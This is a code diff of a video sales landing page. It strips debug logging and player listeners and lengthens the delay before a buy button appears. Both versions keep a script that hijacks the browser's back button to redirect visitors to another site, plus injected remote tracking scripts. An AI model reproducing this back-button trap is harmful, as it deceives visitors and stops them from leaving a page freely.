@@ -15,22 +15,15 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     if (ctaShown) return;
     ctaShown = true;
 
-    console.log('[CTA] Tentando mostrar botão...');
     var ctaElement = document.querySelector('.dtc');
-
     if (ctaElement) {
-      console.log('[CTA] Elemento .dtc encontrado, adicionando classe show');
       ctaElement.classList.add('show');
-      console.log('[CTA] Botão exibido com sucesso');
-    } else {
-      console.warn('[CTA] Elemento .dtc não encontrado!');
     }
   }
 
   setTimeout(function() {
-    console.log('[CTA] 10 segundos decorridos, mostrando botão automaticamente');
     showCTA();
-  }, 10000);
+  }, 1528000);
 
   document.addEventListener('DOMContentLoaded', function() {
     var ctaButton = document.getElementById('cta-button');
@@ -43,106 +36,5 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
       ctaButton.href = currentUrl.toString();
     }
   });
-
-  window.smartPlayerReadyCallback = function(player) {
-    console.log('[CTA] Player pronto, configurando listeners');
-
-    try {
-      player.on("smartautomations", function(event) {
-        console.log('[CTA] Evento smartautomations recebido:', event);
-        if (event.type === "scroll") {
-          console.log('[CTA] Evento de scroll detectado!');
-          showCTA();
-        }
-      });
-
-      player.on("scroll", function(event) {
-        console.log('[CTA] Evento scroll direto recebido:', event);
-        showCTA();
-      });
-
-      console.log('[CTA] Listeners configurados com sucesso');
-    } catch(e) {
-      console.error('[CTA] Erro ao configurar listeners:', e);
-    }
-  };
-
-  (function() {
-    var playerElement = document.querySelector("vturb-smartplayer");
-    if (playerElement) {
-      var observer = new MutationObserver(function() {
-        if (playerElement.player) {
-          console.log('[CTA] Player detectado via MutationObserver');
-          window.smartPlayerReadyCallback(playerElement.player);
-          observer.disconnect();
-        }
-      });
-      observer.observe(playerElement, {attributes: true, childList: true, subtree: true});
-    }
-
-    setTimeout(function() {
-      var playerElement = document.querySelector("vturb-smartplayer");
-      if (playerElement && playerElement.player) {
-        console.log('[CTA] Player detectado via setTimeout');
-        window.smartPlayerReadyCallback(playerElement.player);
-      }
-    }, 3000);
-  })();
 })();
-</script><script>var back_redirect_back_link="https://mindinfonow.online/brdrmw/"+location.search;history.pushState({},"",location.href),history.pushState({},"",location.href),window.addEventListener("popstate",(function(t){t.state&&setTimeout((function(){location.href=back_redirect_back_link}),1)}),!1);</script><script>document.addEventListener("DOMContentLoaded",(()=>{document.querySelectorAll("a").forEach((e=>{e.getAttribute("href")?.includes("#")||(e.getAttribute("href")?.includes("?")?e.setAttribute("href",e.getAttribute("href")+window.location.search.replace("?","&")):e.getAttribute("href")?e.setAttribute("href",e.getAttribute("href")+window.location.search):"")}))}));</script><script type="text/javascript" defer="defer">document.body.appendChild(Object.assign(document.createElement("script"), {src: "https://cdn.atomicatpages.net/cdn/atomicpixel.js?cache=" + Date.now(),async: true,defer: true}));</script><script type="text/javascript" defer="defer">document.body.appendChild(Object.assign(document.createElement("script"), {src: "https://cdn.atomicatpages.net/cdn/a.js?cache=" + Date.now(),async: true,defer: true}));</script><script>(function() {
-  var ctaReleased = false;
-  var originalLog = console.log;
-  var originalWarn = console.warn;
-
-  function handleVTurbConsoleEvent(args) {
-    if (ctaReleased) return;
-
-    var message = Array.prototype.slice.call(args).join(' ');
-
-    if ((message.includes('PlaybackController') && message.includes('call action')) ||
-        message.includes('no call action button found') ||
-        (message.includes('CTA') && message.includes('button'))) {
-      liberarCompra();
-    }
-  }
-
-  function liberarCompra() {
-    if (ctaReleased) return;
-    ctaReleased = true;
-
-    var ctaContainer = document.querySelector('.dtc');
-    if (ctaContainer) {
-      ctaContainer.classList.add('show');
-
-      setTimeout(function() {
-        var button = document.querySelector('.smartplayer-scroll-event');
-        if (button) {
-          button.scrollIntoView({
-            behavior: 'smooth',
-            block: 'center'
-          });
-        }
-      }, 300);
-    }
-  }
-
-  console.log = function() {
-    originalLog.apply(console, arguments);
-    handleVTurbConsoleEvent(arguments);
-  };
-
-  console.warn = function() {
-    originalWarn.apply(console, arguments);
-    handleVTurbConsoleEvent(arguments);
-  };
-
-  window.addEventListener('error', function(e) {
-    e.preventDefault();
-    e.stopPropagation();
-  });
-
-  window.addEventListener('unhandledrejection', function(e) {
-    e.preventDefault();
-    e.stopPropagation();
-  });
-})();</script></body></html>
+</script><script>var back_redirect_back_link="https://mindinfonow.online/brdrmw/"+location.search;history.pushState({},"",location.href),history.pushState({},"",location.href),window.addEventListener("popstate",(function(t){t.state&&setTimeout((function(){location.href=back_redirect_back_link}),1)}),!1);</script><script>document.addEventListener("DOMContentLoaded",(()=>{document.querySelectorAll("a").forEach((e=>{e.getAttribute("href")?.includes("#")||(e.getAttribute("href")?.includes("?")?e.setAttribute("href",e.getAttribute("href")+window.location.search.replace("?","&")):e.getAttribute("href")?e.setAttribute("href",e.getAttribute("href")+window.location.search):"")}))}));</script><script type="text/javascript" defer="defer">document.body.appendChild(Object.assign(document.createElement("script"), {src: "https://cdn.atomicatpages.net/cdn/atomicpixel.js?cache=" + Date.now(),async: true,defer: true}));</script><script type="text/javascript" defer="defer">document.body.appendChild(Object.assign(document.createElement("script"), {src: "https://cdn.atomicatpages.net/cdn/a.js?cache=" + Date.now(),async: true,defer: true}));</script></body></html>
